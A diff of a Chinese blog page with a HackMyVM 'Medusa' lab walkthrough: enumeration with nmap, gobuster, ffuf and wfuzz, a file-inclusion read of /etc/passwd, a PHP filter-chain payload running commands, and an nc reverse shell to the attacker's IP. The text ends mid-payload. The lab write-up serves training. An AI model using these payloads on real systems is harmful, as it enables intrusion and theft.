@@ -142,7 +142,7 @@ ftp> exit
 <meta property="og:url" content="https://7r1UMPHK.github.io/post/hmv_Medusa.html">
 <meta property="og:image" content="https://7r1UMPHK.github.io/image/20251025224622174.webp">
 <title>hmv_Medusa</title>
-
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
 
 
 </head>
@@ -166,7 +166,17 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     body {padding: 8px;}
     .postTitle{font-size:24px;}
 }
-
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
 </style>
 
 
@@ -199,13 +209,13 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 </div>
     <div id="content">
 <div class="markdown-body" id="postBody"><h1>0.简介</h1>
-<p>靶机：<a href="https://hackmyvm.eu/machines/?v=Medusa">https://hackmyvm.eu/machines/?v=Medusa</a>
-难度：绿色
-目标 IP：192.168.205.145
+<p>靶机：<a href="https://hackmyvm.eu/machines/?v=Medusa" rel="nofollow">https://hackmyvm.eu/machines/?v=Medusa</a><br>
+难度：绿色<br>
+目标 IP：192.168.205.145<br>
 本机 IP：192.168.205.128</p>
 <h1>1.扫描</h1>
 <p>nmap起手</p>
-<pre><code>┌──(kali㉿kali)-[~/test]
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ nmap -A -Pn -n --min-rate 10000 192.168.205.145
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-04 17:42 CST
 Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
@@ -240,7 +250,7 @@ Nmap done: 1 IP address (1 host up) scanned in 11.08 seconds
                                                            
 </code></pre>
 <h1>2.踩点</h1>
-<pre><code>┌──(kali㉿kali)-[~/test]
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ ftp 192.168.205.145
 Connected to 192.168.205.145.
 220 (vsFTPd 3.0.3)
@@ -254,11 +264,11 @@ ftp&gt; exit
 221 Goodbye.
 </code></pre>
 <p>不许登，那去看80。是个默认页</p>
-<p><img src="https://7r1umphk.github.io/image/20250331190711760.png" alt="image-20250331190711601" /></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/ff137dc054733dbfbcec8e64f72df0dd46b965f40a469b341925d969b5ead0e9/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303333313139303731313736302e706e67"><img src="https://camo.githubusercontent.com/ff137dc054733dbfbcec8e64f72df0dd46b965f40a469b341925d969b5ead0e9/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303333313139303731313736302e706e67" alt="image-20250331190711601" data-canonical-src="https://7r1umphk.github.io/image/20250331190711760.png" style="max-width: 100%;"></a></p>
 <p>有关类似是用户名的东西Kraken，不管先，我们目录爆破一下</p>
 <p>ps:因为它有一个manual路径会爆出很多没有利用价值的二级目录，所以我们这次用gobuster，然后再过滤一些403的没用状态码</p>
-<pre><code>┌──(kali㉿kali)-[~/test]
-└─$ gobuster dir -u http://192.168.205.145 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v &quot;403&quot;
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ gobuster dir -u http://192.168.205.145 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v "403"
 ===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
@@ -284,8 +294,8 @@ Finished
 ===============================================================
 </code></pre>
 <p>接着爆破</p>
-<pre><code>┌──(kali㉿kali)-[~/test]
-└─$ gobuster dir -u http://192.168.205.145/hades/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v &quot;403&quot;
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ gobuster dir -u http://192.168.205.145/hades/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v "403"
 ===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
@@ -310,12 +320,12 @@ Finished
 ===============================================================
 </code></pre>
 <p>访问/door.php</p>
-<p><img src="https://7r1umphk.github.io/image/20250331190726175.png" alt="image-20250331190726085" /></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/b1f299091a4918e6d98f35ec5123eec970fc78f84da5a37536320b79d839279c/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303333313139303732363137352e706e67"><img src="https://camo.githubusercontent.com/b1f299091a4918e6d98f35ec5123eec970fc78f84da5a37536320b79d839279c/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303333313139303732363137352e706e67" alt="image-20250331190726085" data-canonical-src="https://7r1umphk.github.io/image/20250331190726175.png" style="max-width: 100%;"></a></p>
 <p>输入之前获得的Kraken</p>
 <p>ps:有点搞笑，它规定了只可以输入6个字符</p>
-<p><img src="https://7r1umphk.github.io/image/20250331190733131.png" alt="image-20250331190733042" /></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/4051cb78112e8f0a975e8c9a9dd95903d2f62222f7309aae36572afbe152647f/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303333313139303733333133312e706e67"><img src="https://camo.githubusercontent.com/4051cb78112e8f0a975e8c9a9dd95903d2f62222f7309aae36572afbe152647f/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303333313139303733333133312e706e67" alt="image-20250331190733042" data-canonical-src="https://7r1umphk.github.io/image/20250331190733131.png" style="max-width: 100%;"></a></p>
 <p>获得一个域名，我们加上，并且爆破一下子域</p>
-<pre><code>┌──(kali㉿kali)-[~/test]
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ ffuf -u http://medusa.hmv -H 'Host: FUZZ.medusa.hmv' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fw 3423  
 
         /'___\  /'___\           /'___\     
@@ -344,10 +354,10 @@ dev                     [Status: 200, Size: 1973, Words: 374, Lines: 26, Duratio
 [WARN] Caught keyboard interrupt (Ctrl-C)
 </code></pre>
 <p>加上访问</p>
-<p><img src="https://7r1umphk.github.io/image/20250331190750557.png" alt="image-20250331190750401" />
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/e9b387ab89d78328756f1bc395aadaa58fd3166b540701c3ca68d4ae6a27da34/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303333313139303735303535372e706e67"><img src="https://camo.githubusercontent.com/e9b387ab89d78328756f1bc395aadaa58fd3166b540701c3ca68d4ae6a27da34/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303333313139303735303535372e706e67" alt="image-20250331190750401" data-canonical-src="https://7r1umphk.github.io/image/20250331190750557.png" style="max-width: 100%;"></a><br>
 没看到啥，目录爆破</p>
-<pre><code>┌──(kali㉿kali)-[~/test]
-└─$ gobuster dir -u http://dev.medusa.hmv/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v &quot;403&quot;
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ gobuster dir -u http://dev.medusa.hmv/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v "403"
 ===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
@@ -374,8 +384,8 @@ Progress: 470664 / 598005 (78.71%)
 Progress: 491780 / 598005 (82.24%)
 </code></pre>
 <p>接着爆破/files</p>
-<pre><code>┌──(kali㉿kali)-[~/test]
-└─$ gobuster dir -u http://dev.medusa.hmv/files/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v &quot;403&quot;
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ gobuster dir -u http://dev.medusa.hmv/files/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v "403"
 ===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
@@ -403,8 +413,8 @@ Starting gobuster in directory enumeration mode
                                                  
 </code></pre>
 <p>谜语人滚出哥谭</p>
-<pre><code>┌──(kali㉿kali)-[~/test]
-└─$ wfuzz -u &quot;http://dev.medusa.hmv/files/system.php?FUZZ=id&quot; -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 0
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ wfuzz -u "http://dev.medusa.hmv/files/system.php?FUZZ=id" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 0
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
@@ -425,7 +435,7 @@ Requests/sec.: 1962.074
 
                                                                                                                                     
 ┌──(kali㉿kali)-[~/test]
-└─$ wfuzz -u &quot;http://dev.medusa.hmv/files/system.php?FUZZ=/etc/passwd&quot; -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 0
+└─$ wfuzz -u "http://dev.medusa.hmv/files/system.php?FUZZ=/etc/passwd" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 0
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
@@ -438,7 +448,7 @@ Total requests: 119600
 ID           Response   Lines    Word       Chars       Payload                                                            
 =====================================================================
 
-000000167:   200        27 L     40 W       1452 Ch     &quot;view&quot;                                                             
+000000167:   200        27 L     40 W       1452 Ch     "view"                                                             
 ^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
 
 Total time: 2.243865
@@ -447,23 +457,23 @@ Filtered Requests: 308
 Requests/sec.: 137.7087
 </code></pre>
 <p>看眼有没有密钥</p>
-<pre><code>┌──(kali㉿kali)-[~/test]
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ curl http://dev.medusa.hmv/files/system.php?view=/home/spectre/.ssh/id_rsa
                            
 </code></pre>
 <p>到这我习惯就是测php filter</p>
-<pre><code>┌──(kali㉿kali)-[~/test]
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ curl http://dev.medusa.hmv/files/system.php?view=php://filter/convert.base64-encode/resource=/etc/passwd
 cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLXRpbWVzeW5jOng6MTA0OjExMDpzeXN0ZW1kIFRpbWUgU3luY2hyb25pemF0aW9uLCwsOi9ydW4vc3lzdGVtZDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA1OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kc3BlY3RyZTp4OjEwMDA6MTAwMDpzcGVjdHJlLCwsOi9ob21lL3NwZWN0cmU6L2Jpbi9iYXNoCnN5c3RlbWQtY29yZWR1bXA6eDo5OTk6OTk5OnN5c3RlbWQgQ29yZSBEdW1wZXI6LzovdXNyL3NiaW4vbm9sb2dpbgpmdHA6eDoxMDY6MTEzOmZ0cCBkYWVtb24sLCw6L3Nydi9mdHA6L3Vzci9zYmluL25vbG9naW4K                                                                                                                                    
 </code></pre>
 <p>那直接执行命令试试</p>
-<pre><code>┌──(kali㉿kali)-[~/test]
-└─$ curl &quot;http://dev.medusa.hmv/files/system.php?view=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;0=id&quot; --output -
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ curl "http://dev.medusa.hmv/files/system.php?view=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;0=id" --output -
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 �B�0���&gt;==�@C������&gt;==�@C������&gt;==�@C������&gt;==�@C������&gt;==�@C������&gt;==�@          
 </code></pre>
 <p>弹shell</p>
-<pre><code>http://dev.medusa.hmv/files/system.php?view=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;0=nc%20192.168.205.128%208888%20-e%20/bin/bash
+<pre class="notranslate"><code class="notranslate">http://dev.medusa.hmv/files/system.php?view=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|co